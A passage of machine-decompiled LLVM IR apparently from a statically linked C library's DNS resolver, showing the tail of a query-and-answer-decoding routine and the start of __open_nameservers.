  br i1 %v3_1000dcc8, label %dec_label_pc_1000df34, label %dec_label_pc_1000dcd0

dec_label_pc_1000dcd0:                            ; preds = %dec_label_pc_1000dcc4
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_1000dcd4, label %dec_label_pc_1000dcdc, label %dec_label_pc_1000dd44

dec_label_pc_1000dcdc:                            ; preds = %dec_label_pc_1000dcd0
  %v0_1000dcdc = load i32, i32* %r17.global-to-local, align 4
  %v3_1000dcdc = icmp eq i32 %v0_1000dcdc, 0
  br i1 %v3_1000dcdc, label %dec_label_pc_1000dce4, label %dec_label_pc_1000dd38

dec_label_pc_1000dce4:                            ; preds = %dec_label_pc_1000dcdc
  store i32 ptrtoint (i32* @global_var_100249a8.603 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000da40, i32* %r28.global-to-local, align 4
  store i32 %v2_1000da40, i32* @r3, align 4
  %v0_1000dd00 = call i32 @__pthread_return_void()
  %v0_1000dd08 = call i32 @__pthread_return_0()
  %v3_1000dd10 = load i32, i32* @global_var_10024a90.654, align 4
  store i32 %v2_1000da40, i32* @r3, align 4
  %v1_1000dd1c = add i32 %v3_1000dd10, -1
  store i32 %v1_1000dd1c, i32* %r29.global-to-local, align 4
  %v0_1000dd20 = call i32 @__pthread_return_void()
  %v0_1000dd24 = load i32, i32* @r22, align 4
  %v2_1000dd24 = icmp slt i32 %v0_1000dd24, %v1_1000dd1c
  br i1 %v2_1000dd24, label %dec_label_pc_1000dd2c, label %dec_label_pc_1000dd38

dec_label_pc_1000dd2c:                            ; preds = %dec_label_pc_1000dce4
  %v1_1000dd2c = add i32 %v0_1000dd24, 1
  store i32 %v1_1000dd2c, i32* @r22, align 4
  %v0_1000dd30 = load i32, i32* @r20, align 4
  store i32 %v0_1000dd30, i32* @r25, align 4
  br label %dec_label_pc_1000dfa8thread-pre-split.backedge

dec_label_pc_1000dd38:                            ; preds = %dec_label_pc_1000dce4, %dec_label_pc_1000dcdc
  %v0_1000dd38 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_1000dd6c

dec_label_pc_1000dd44:                            ; preds = %dec_label_pc_1000dcd0
  br i1 %v3_1000dd44, label %dec_label_pc_1000dd4c, label %dec_label_pc_1000df34

dec_label_pc_1000dd4c:                            ; preds = %dec_label_pc_1000dd44
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_1000dd64, label %dec_label_pc_1000dd58

dec_label_pc_1000dd58:                            ; preds = %dec_label_pc_1000dd4c
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_1000dd8410 = load i32, i32* @r30, align 4
  store i32 %v0_1000dd8410, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000dd74

dec_label_pc_1000dd64:                            ; preds = %dec_label_pc_1000dd4c
  %v0_1000dd64 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_1000dd6c

dec_label_pc_1000dd6c:                            ; preds = %dec_label_pc_1000dd38, %dec_label_pc_1000dd64
  %storemerge3 = phi i32 [ %v0_1000dd64, %dec_label_pc_1000dd64 ], [ %v0_1000dd38, %dec_label_pc_1000dd38 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1000dd64 ], [ 1, %dec_label_pc_1000dd38 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_1000dd6c = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_1000dd6c, align 4
  br label %dec_label_pc_1000dfd0

dec_label_pc_1000dd74:                            ; preds = %dec_label_pc_1000dd58, %dec_label_pc_1000dd74
  %v0_1000dd8414 = phi i32 [ %v0_1000dd8410, %dec_label_pc_1000dd58 ], [ %v0_1000dd84, %dec_label_pc_1000dd74 ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_1000dd58 ], [ %v2_1000dd78, %dec_label_pc_1000dd74 ]
  store i32 268492152, i32* @lr, align 4
  %v2_1000dd74 = call i32 @__length_question(i32 %v0_1000dd8414, i32 %storemerge213)
  %v0_1000dd78 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000dd78 = add i32 %v0_1000dd78, %v2_1000dd74
  %v0_1000dd88.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_1000dd78, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_1000dd78, i32* @r4, align 4
  %v0_1000dd84 = load i32, i32* @r30, align 4
  store i32 %v0_1000dd84, i32* @r3, align 4
  %v2_1000dd88 = icmp slt i32 %v0_1000dd88.pr, 1
  %v1_1000dd8c = add i32 %v0_1000dd88.pr, 1
  store i32 %v1_1000dd8c, i32* %r29.global-to-local, align 4
  br i1 %v2_1000dd88, label %dec_label_pc_1000dd74, label %dec_label_pc_1000dd94

dec_label_pc_1000dd94:                            ; preds = %dec_label_pc_1000dd74
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_1000dd50, label %dec_label_pc_1000dee0, label %dec_label_pc_1000dee8

dec_label_pc_1000dda4:                            ; preds = %dec_label_pc_1000dee0
  store i32 %v2_1000dda4, i32* %r29.global-to-local, align 4
  %v0_1000dda8 = load i32, i32* @r30, align 4
  store i32 268492220, i32* @lr, align 4
  %v5_1000ddb8 = call i32 @__decode_answer(i32 %v0_1000dda8, i32 %v0_1000ddac, i32 %v1_1000dee0, i32* nonnull %stack_var_-184)
  store i32 %v5_1000ddb8, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_1000ddb8, -1
  br i1 %tmp64, label %dec_label_pc_1000dddc, label %dec_label_pc_1000ddc4

dec_label_pc_1000ddc4:                            ; preds = %dec_label_pc_1000dda4
  %v0_1000ddc4 = load i32, i32* @r24, align 4
  %v3_1000ddc4 = icmp eq i32 %v0_1000ddc4, 0
  br i1 %v3_1000ddc4, label %dec_label_pc_1000df34, label %dec_label_pc_1000ddcc

dec_label_pc_1000ddcc:                            ; preds = %dec_label_pc_1000ddc4
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_1000ddd0, label %dec_label_pc_1000df34, label %dec_label_pc_1000dee8

dec_label_pc_1000dddc:                            ; preds = %dec_label_pc_1000dda4
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_1000dde0 = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_1000dde0, label %dec_label_pc_1000de84, label %dec_label_pc_1000dde8

dec_label_pc_1000dde8:                            ; preds = %dec_label_pc_1000dddc
  %v0_1000dde8 = load i32, i32* @r31, align 4
  store i32 %v2_1000dda4, i32* @r4, align 4
  %v1_1000ddf0 = add i32 %v0_1000dde8, 28
  %v2_1000ddf0 = inttoptr i32 %v1_1000ddf0 to i32*
  %v3_1000ddf0 = load i32, i32* %v2_1000ddf0, align 4
  store i32 %v3_1000ddf0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000dde8, i32* @r3, align 4
  %v1_1000ddf8 = add i32 %v0_1000dde8, 36
  %v2_1000ddf8 = inttoptr i32 %v1_1000ddf8 to i32*
  %v3_1000ddf8 = load i32, i32* %v2_1000ddf8, align 4
  store i32 %v3_1000ddf8, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268492304, i32* @lr, align 4
  %v0_1000de0c = call i32 @memcpy()
  %v0_1000de10 = load i32, i32* @r31, align 4
  %v1_1000de10 = add i32 %v0_1000de10, 4
  %v2_1000de10 = inttoptr i32 %v1_1000de10 to i32*
  %v3_1000de10 = load i32, i32* %v2_1000de10, align 4
  %v3_1000de14 = icmp eq i32 %v3_1000de10, 24
  br i1 %v3_1000de14, label %dec_label_pc_1000dde8.dec_label_pc_1000de38_crit_edge, label %dec_label_pc_1000de1c

dec_label_pc_1000dde8.dec_label_pc_1000de38_crit_edge: ; preds = %dec_label_pc_1000dde8
  %v1_1000de38.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_1000de38

dec_label_pc_1000de1c:                            ; preds = %dec_label_pc_1000dde8
  %v1_1000de1c = add i32 %v0_1000de10, 28
  %v2_1000de1c = inttoptr i32 %v1_1000de1c to i32*
  %v3_1000de1c = load i32, i32* %v2_1000de1c, align 4
  store i32 %v3_1000de1c, i32* %r0.global-to-local, align 4
  %v3_1000de20 = icmp eq i32 %v3_1000de1c, 0
  br i1 %v3_1000de20, label %dec_label_pc_1000dee8, label %dec_label_pc_1000de28

dec_label_pc_1000de28:                            ; preds = %dec_label_pc_1000de1c
  %v0_1000de28 = load i32, i32* %r16.global-to-local, align 4
  %v3_1000de28 = icmp eq i32 %v0_1000de28, 1
  br i1 %v3_1000de28, label %dec_label_pc_1000de38, label %dec_label_pc_1000de30

dec_label_pc_1000de30:                            ; preds = %dec_label_pc_1000de28
  %v3_1000de30 = icmp eq i32 %v0_1000de28, 28
  br i1 %v3_1000de30, label %dec_label_pc_1000de38, label %dec_label_pc_1000dee8

dec_label_pc_1000de38:                            ; preds = %dec_label_pc_1000dde8.dec_label_pc_1000de38_crit_edge, %dec_label_pc_1000de30, %dec_label_pc_1000de28
  %v1_1000de38 = phi i32 [ %v1_1000de38.pre, %dec_label_pc_1000dde8.dec_label_pc_1000de38_crit_edge ], [ 28, %dec_label_pc_1000de30 ], [ 1, %dec_label_pc_1000de28 ]
  %v4_1000de38 = icmp eq i32 %v3_1000de10, %v1_1000de38
  br i1 %v4_1000de38, label %dec_label_pc_1000de4c, label %dec_label_pc_1000de40

dec_label_pc_1000de40:                            ; preds = %dec_label_pc_1000de38
  %v1_1000de40 = inttoptr i32 %v0_1000de10 to i32*
  %v2_1000de40 = load i32, i32* %v1_1000de40, align 4
  store i32 %v2_1000de40, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000de48.662 to i32), i32* @lr, align 4
  %v0_1000de44 = call i32 @free()
  br label %dec_label_pc_1000decc

dec_label_pc_1000de4c:                            ; preds = %dec_label_pc_1000de38
  %v1_1000de50 = add i32 %v0_1000de10, 16
  %v2_1000de50 = inttoptr i32 %v1_1000de50 to i32*
  %v3_1000de50 = load i32, i32* %v2_1000de50, align 4
  store i32 %v3_1000de50, i32* %r11.global-to-local, align 4
  %v0_1000de54 = load i32, i32* @r24, align 4
  %v2_1000de54 = sub i32 %tmp35, %v0_1000de54
  %v1_1000de58 = add i32 %v0_1000de10, 32
  %v2_1000de58 = inttoptr i32 %v1_1000de58 to i32*
  %v3_1000de58 = load i32, i32* %v2_1000de58, align 4
  store i32 %v3_1000de58, i32* %r0.global-to-local, align 4
  %v1_1000de5c = add i32 %v2_1000de54, -1
  %v1_1000de60 = add i32 %v3_1000de50, 4
  %v2_1000de64 = mul i32 %v1_1000de5c, %v1_1000de60
  store i32 %v2_1000de64, i32* %r11.global-to-local, align 4
  %v2_1000de68 = add i32 %v0_1000de10, 36
  %v3_1000de68 = inttoptr i32 %v2_1000de68 to i32*
  store i32 %v1_1000de5c, i32* %v3_1000de68, align 4
  %v0_1000de6c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000de6c = load i32, i32* %r0.global-to-local, align 4
  %v3_1000de6c = icmp ugt i32 %v0_1000de6c, %v1_1000de6c
  br i1 %v3_1000de6c, label %dec_label_pc_1000dee8, label %dec_label_pc_1000de74

dec_label_pc_1000de74:                            ; preds = %dec_label_pc_1000de4c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000de7c = load i32, i32* @r31, align 4
  %v2_1000de7c = add i32 %v1_1000de7c, 36
  %v3_1000de7c = inttoptr i32 %v2_1000de7c to i32*
  store i32 0, i32* %v3_1000de7c, align 4
  br label %dec_label_pc_1000decc

dec_label_pc_1000de84:                            ; preds = %dec_label_pc_1000dddc
  %v3_1000de84 = load i32, i32* %stack_var_-184, align 4
  store i32 %v3_1000de84, i32* @r3, align 4
  store i32 268492428, i32* @lr, align 4
  %v0_1000de88 = call i32 @free()
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_1000de90 = load i32, i32* %r16.global-to-local, align 4
  %v4_1000de90 = icmp eq i32 %tmp29, %v1_1000de90
  br i1 %v4_1000de90, label %dec_label_pc_1000de98, label %dec_label_pc_1000decc

dec_label_pc_1000de98:                            ; preds = %dec_label_pc_1000de84
  %v0_1000de98 = load i32, i32* @r31, align 4
  %v1_1000de98 = add i32 %v0_1000de98, 16
  %v2_1000de98 = inttoptr i32 %v1_1000de98 to i32*
  %v3_1000de98 = load i32, i32* %v2_1000de98, align 4
  store i32 %v3_1000de98, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_1000dea0 = icmp eq i32 %v3_1000de98, %tmp28
  br i1 %v4_1000dea0, label %dec_label_pc_1000dea8, label %dec_label_pc_1000df2c

dec_label_pc_1000dea8:                            ; preds = %dec_label_pc_1000de98
  %v1_1000dea8 = add i32 %v0_1000de98, 36
  %v2_1000dea8 = inttoptr i32 %v1_1000dea8 to i32*
  %v3_1000dea8 = load i32, i32* %v2_1000dea8, align 4
  %v1_1000deac = add i32 %v0_1000de98, 28
  %v2_1000deac = inttoptr i32 %v1_1000deac to i32*
  %v3_1000deac = load i32, i32* %v2_1000deac, align 4
  store i32 %v3_1000deac, i32* %r0.global-to-local, align 4
  %v2_1000deb0 = mul i32 %v3_1000dea8, %tmp28
  %v2_1000deb8 = add i32 %v3_1000deac, %v2_1000deb0
  store i32 %v2_1000deb8, i32* @r3, align 4
  store i32 268492480, i32* @lr, align 4
  %v0_1000debc = call i32 @memcpy()
  %v0_1000dec0 = load i32, i32* @r31, align 4
  %v1_1000dec0 = add i32 %v0_1000dec0, 36
  %v2_1000dec0 = inttoptr i32 %v1_1000dec0 to i32*
  %v3_1000dec0 = load i32, i32* %v2_1000dec0, align 4
  %v1_1000dec4 = add i32 %v3_1000dec0, 1
  store i32 %v1_1000dec4, i32* %v2_1000dec0, align 4
  br label %dec_label_pc_1000decc

dec_label_pc_1000decc:                            ; preds = %dec_label_pc_1000de84, %dec_label_pc_1000de74, %dec_label_pc_1000de40, %dec_label_pc_1000dea8
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_1000dea8 ], [ 0, %dec_label_pc_1000de84 ], [ 0, %dec_label_pc_1000de74 ], [ %stack_var_-88.118, %dec_label_pc_1000de40 ]
  %v0_1000decc = load i32, i32* @r28, align 4
  %v1_1000decc = load i32, i32* %r15.global-to-local, align 4
  %v2_1000decc = add i32 %v1_1000decc, %v0_1000decc
  store i32 %v2_1000decc, i32* %r28.global-to-local, align 4
  %v0_1000ded0 = load i32, i32* @r24, align 4
  %v1_1000ded0 = add i32 %v0_1000ded0, 1
  store i32 %v1_1000ded0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_1000ded8 = icmp slt i32 %v1_1000ded0, %tmp35
  br i1 %v2_1000ded8, label %dec_label_pc_1000dee0, label %dec_label_pc_1000dee8

dec_label_pc_1000dee0:                            ; preds = %dec_label_pc_1000dd94, %dec_label_pc_1000decc
  %v0_1000ddac = phi i32 [ %v2_1000decc, %dec_label_pc_1000decc ], [ %v2_1000dd78, %dec_label_pc_1000dd94 ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_1000decc ], [ 1, %dec_label_pc_1000dd94 ]
  %v1_1000dee0 = load i32, i32* @r27, align 4
  %v2_1000dee0 = icmp slt i32 %v0_1000ddac, %v1_1000dee0
  br i1 %v2_1000dee0, label %dec_label_pc_1000dda4, label %dec_label_pc_1000dee8

dec_label_pc_1000dee8:                            ; preds = %dec_label_pc_1000ddcc, %dec_label_pc_1000dd94, %dec_label_pc_1000dee0, %dec_label_pc_1000de1c, %dec_label_pc_1000de4c, %dec_label_pc_1000decc, %dec_label_pc_1000de30
  %v0_1000dee8 = load i32, i32* @r19, align 4
  store i32 268492528, i32* @lr, align 4
  %v1_1000deec = call i32 @__libc_close(i32 %v0_1000dee8)
  %v3_1000def4 = icmp eq i32 %arg5, 0
  %v0_1000df04 = load i32, i32* @r30, align 4
  br i1 %v3_1000def4, label %dec_label_pc_1000df04, label %dec_label_pc_1000defc

dec_label_pc_1000defc:                            ; preds = %dec_label_pc_1000dee8
  %v2_1000defc = inttoptr i32 %arg5 to i32*
  store i32 %v0_1000df04, i32* %v2_1000defc, align 4
  br label %dec_label_pc_1000df0c

dec_label_pc_1000df04:                            ; preds = %dec_label_pc_1000dee8
  store i32 %v0_1000df04, i32* @r3, align 4
  store i32 268492556, i32* @lr, align 4
  %v0_1000df08 = call i32 @free()
  br label %dec_label_pc_1000df0c

dec_label_pc_1000df0c:                            ; preds = %dec_label_pc_1000defc, %dec_label_pc_1000df04
  %v0_1000df0c = load i32, i32* @r21, align 4
  store i32 %v0_1000df0c, i32* @r3, align 4
  store i32 268632064, i32* %r29.global-to-local, align 4
  store i32 268492568, i32* @lr, align 4
  %v0_1000df14 = call i32 @free()
  store i32 ptrtoint (i32* @global_var_1002acc8.650 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000e010

dec_label_pc_1000df2c:                            ; preds = %dec_label_pc_1000de98
  %v1_1000df2c = inttoptr i32 %v0_1000de98 to i32*
  %v2_1000df2c = load i32, i32* %v1_1000df2c, align 4
  store i32 %v2_1000df2c, i32* @r3, align 4
  store i32 268492596, i32* @lr, align 4
  %v0_1000df30 = call i32 @free()
  br label %dec_label_pc_1000df34

dec_label_pc_1000df34:                            ; preds = %dec_label_pc_1000dd44, %dec_label_pc_1000dcac, %dec_label_pc_1000ddcc, %dec_label_pc_1000ddc4, %dec_label_pc_1000dcc4, %dec_label_pc_1000dc8c, %dec_label_pc_1000df2c
  %v0_1000df34 = load i32, i32* %r17.global-to-local, align 4
  %v3_1000df34 = icmp eq i32 %v0_1000df34, 0
  br i1 %v3_1000df34, label %dec_label_pc_1000df3c, label %dec_label_pc_1000df8c

dec_label_pc_1000df3c:                            ; preds = %dec_label_pc_1000df34
  store i32 ptrtoint (i32* @global_var_100249a8.603 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000da40, i32* %r28.global-to-local, align 4
  store i32 %v2_1000da40, i32* @r3, align 4
  %v0_1000df58 = call i32 @__pthread_return_void()
  %v0_1000df60 = call i32 @__pthread_return_0()
  %v3_1000df68 = load i32, i32* @global_var_10024a90.654, align 4
  store i32 %v2_1000da40, i32* @r3, align 4
  %v1_1000df74 = add i32 %v3_1000df68, -1
  store i32 %v1_1000df74, i32* %r29.global-to-local, align 4
  %v0_1000df78 = call i32 @__pthread_return_void()
  %v0_1000df7c = load i32, i32* @r22, align 4
  %v2_1000df7c = icmp slt i32 %v0_1000df7c, %v1_1000df74
  br i1 %v2_1000df7c, label %dec_label_pc_1000df84, label %dec_label_pc_1000df8c

dec_label_pc_1000df84:                            ; preds = %dec_label_pc_1000df3c
  %v1_1000df84 = add i32 %v0_1000df7c, 1
  store i32 %v1_1000df84, i32* @r22, align 4
  br label %dec_label_pc_1000dfa8thread-pre-split.backedge

dec_label_pc_1000dfa8thread-pre-split.backedge:   ; preds = %dec_label_pc_1000df84, %dec_label_pc_1000dd2c, %dec_label_pc_1000dfa4
  %v0_1000dfa8.pr = load i32, i32* %r18.global-to-local, align 4
  %tmp65 = icmp ult i32 %v0_1000dfa8.pr, 3
  br i1 %tmp65, label %dec_label_pc_1000da9c.lr.ph, label %dec_label_pc_1000dfc0

dec_label_pc_1000df8c:                            ; preds = %dec_label_pc_1000dc3c, %dec_label_pc_1000df3c, %dec_label_pc_1000df34, %dec_label_pc_1000dc54
  %v0_1000df8c = load i32, i32* @r26, align 4
  %v1_1000df8c = add i32 %v0_1000df8c, 1
  store i32 %v1_1000df8c, i32* %r0.global-to-local, align 4
  %v1_1000df90 = load i32, i32* @r23, align 4
  %v2_1000df90 = srem i32 %v1_1000df8c, %v1_1000df90
  store i32 %v2_1000df90, i32* @r26, align 4
  %v5_1000df98 = icmp eq i32 %v2_1000df90, 0
  br i1 %v5_1000df98, label %dec_label_pc_1000dfa0, label %dec_label_pc_1000dfa4

dec_label_pc_1000dfa0:                            ; preds = %dec_label_pc_1000df8c
  %v0_1000dfa0 = load i32, i32* %r18.global-to-local, align 4
  %v1_1000dfa0 = add i32 %v0_1000dfa0, 1
  store i32 %v1_1000dfa0, i32* %r18.global-to-local, align 4
  br label %dec_label_pc_1000dfa4

dec_label_pc_1000dfa4:                            ; preds = %dec_label_pc_1000df8c, %dec_label_pc_1000dfa0
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_1000dfa8thread-pre-split.backedge

dec_label_pc_1000da9c.lr.ph:                      ; preds = %dec_label_pc_1000da9c.lr.ph.lr.ph, %dec_label_pc_1000dfa8thread-pre-split.backedge
  br label %dec_label_pc_1000da9c

dec_label_pc_1000dfb4:                            ; preds = %dec_label_pc_1000da14, %dec_label_pc_1000da0c, %dec_label_pc_1000da04, %entry
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_1000dfc0

dec_label_pc_1000dfc0:                            ; preds = %dec_label_pc_1000dfa8thread-pre-split.backedge, %dec_label_pc_1000daac, %dec_label_pc_1000db88, %dec_label_pc_1000dc4c, %dec_label_pc_1000da20, %dec_label_pc_1000dfb4
  %v0_1000dfc0 = call i32 @__GI___h_errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1000dfc8 = inttoptr i32 %v0_1000dfc0 to i32*
  store i32 -1, i32* %v2_1000dfc8, align 4
  %v0_1000dfcc = load i32, i32* @r25, align 4
  store i32 %v0_1000dfcc, i32* @r20, align 4
  br label %dec_label_pc_1000dfd0

dec_label_pc_1000dfd0:                            ; preds = %dec_label_pc_1000dd6c, %dec_label_pc_1000dfc0
  %v0_1000dfd0 = load i32, i32* @r19, align 4
  %v3_1000dfd0 = icmp eq i32 %v0_1000dfd0, -1
  br i1 %v3_1000dfd0, label %dec_label_pc_1000dfe0, label %dec_label_pc_1000dfd8

dec_label_pc_1000dfd8:                            ; preds = %dec_label_pc_1000dfd0
  store i32 268492768, i32* @lr, align 4
  %v1_1000dfdc = call i32 @__libc_close(i32 %v0_1000dfd0)
  br label %dec_label_pc_1000dfe0

dec_label_pc_1000dfe0:                            ; preds = %dec_label_pc_1000dfd0, %dec_label_pc_1000dfd8
  %v0_1000dfe0 = load i32, i32* @r21, align 4
  store i32 %v0_1000dfe0, i32* @r3, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268492780, i32* @lr, align 4
  %v0_1000dfe8 = call i32 @free()
  %v0_1000dfec = load i32, i32* @r30, align 4
  store i32 %v0_1000dfec, i32* @r3, align 4
  store i32 268492788, i32* @lr, align 4
  %v0_1000dff0 = call i32 @free()
  %v0_1000dff4 = load i32, i32* @r26, align 4
  %v3_1000dff4 = icmp eq i32 %v0_1000dff4, -1
  br i1 %v3_1000dff4, label %dec_label_pc_1000e040, label %dec_label_pc_1000dffc

dec_label_pc_1000dffc:                            ; preds = %dec_label_pc_1000dfe0
  store i32 ptrtoint (i32* @global_var_1002acc8.650 to i32), i32* %r29.global-to-local, align 4
  %v2_1000e008 = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_1000e010

dec_label_pc_1000e010:                            ; preds = %dec_label_pc_1000df0c, %dec_label_pc_1000dffc
  %storemerge68 = phi i32 [ %v2_1000e008, %dec_label_pc_1000dffc ], [ %v2_1000da40, %dec_label_pc_1000df0c ]
  %v1_1000e014.pre-phi = phi i32 [ %v2_1000e008, %dec_label_pc_1000dffc ], [ %v2_1000da40, %dec_label_pc_1000df0c ]
  store i32 %storemerge68, i32* %r28.global-to-local, align 4
  store i32 %v1_1000e014.pre-phi, i32* @r3, align 4
  %v0_1000e018 = call i32 @__pthread_return_void()
  %v0_1000e020 = call i32 @__pthread_return_0()
  %v0_1000e028 = load i32, i32* @r26, align 4
  store i32 %v0_1000e028, i32* @global_var_10024a88.651, align 4
  store i32 %v1_1000e014.pre-phi, i32* @r3, align 4
  %v0_1000e038 = load i32, i32* @r20, align 4
  %v1_1000e038 = trunc i32 %v0_1000e038 to i16
  store i16 %v1_1000e038, i16* @global_var_100249a4.652, align 2
  %v0_1000e03c = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000e040

dec_label_pc_1000e040:                            ; preds = %dec_label_pc_1000dfe0, %dec_label_pc_1000e010
  store i32 %v0_1000d9c0, i32* %r0.global-to-local, align 4
  %v0_1000e044 = load i32, i32* @r27, align 4
  ret i32 %v0_1000e044

; uselistorder directives
  uselistorder i32 %v1_1000e014.pre-phi, { 1, 0 }
  uselistorder i32 %v2_1000df90, { 1, 0 }
  uselistorder i32 %v0_1000df04, { 1, 0 }
  uselistorder i32 %v1_1000dee0, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_1000ddac, { 1, 0 }
  uselistorder i32 %v1_1000ded0, { 1, 0 }
  uselistorder i32 %v0_1000de98, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000de5c, { 1, 0 }
  uselistorder i32 %v0_1000dde8, { 2, 1, 0 }
  uselistorder i32 %v0_1000dd84, { 1, 0 }
  uselistorder i32 %v2_1000dd78, { 0, 2, 1, 3 }
  uselistorder i32 %v4_1000dc9c, { 1, 0 }
  uselistorder i32 %v1_1000db9c, { 1, 0 }
  uselistorder i32 %v1_1000db70, { 1, 0 }
  uselistorder i32 %v1_1000db3c, { 1, 0 }
  uselistorder i32 %v1_1000dad4, { 1, 0 }
  uselistorder i32 %v2_1000da40, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %r28.global-to-local, { 0, 2, 3, 5, 4, 1, 6, 7, 8, 9 }
  uselistorder i32* %r18.global-to-local, { 0, 2, 5, 1, 3, 4, 6 }
  uselistorder i32* %r17.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r16.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 16, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 2, 17, 0, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 101, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 4, 3, 5, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 7, 6, 5, 4, 3, 2, 8, 1 }
  uselistorder i32 17, { 2, 3, 12, 4, 9, 10, 5, 11, 6, 16, 17, 13, 14, 15, 0, 1, 7, 8 }
  uselistorder i32 (i32)* @inet_addr, { 0, 3, 2, 1 }
  uselistorder i32 53, { 2, 0, 1 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__libc_close, { 13, 12, 9, 14, 19, 18, 17, 16, 15, 11, 10, 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i16* @global_var_100249a4.652, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 1, 7, 0, 4, 5, 6 }
  uselistorder i32 512, { 2, 6, 0, 1, 7, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000e040, { 1, 0 }
  uselistorder label %dec_label_pc_1000e010, { 1, 0 }
  uselistorder label %dec_label_pc_1000dfe0, { 1, 0 }
  uselistorder label %dec_label_pc_1000dfd0, { 1, 0 }
  uselistorder label %dec_label_pc_1000dfc0, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_1000da9c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1000dfa4, { 1, 0 }
  uselistorder label %dec_label_pc_1000df8c, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1000dfa8thread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000df34, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_1000df0c, { 1, 0 }
  uselistorder label %dec_label_pc_1000dee8, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000dee0, { 1, 0 }
  uselistorder label %dec_label_pc_1000decc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000de38, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000dd74, { 1, 0 }
  uselistorder label %dec_label_pc_1000dd6c, { 1, 0 }
  uselistorder label %dec_label_pc_1000dc10, { 1, 0 }
  uselistorder label %dec_label_pc_1000db88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000daac, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
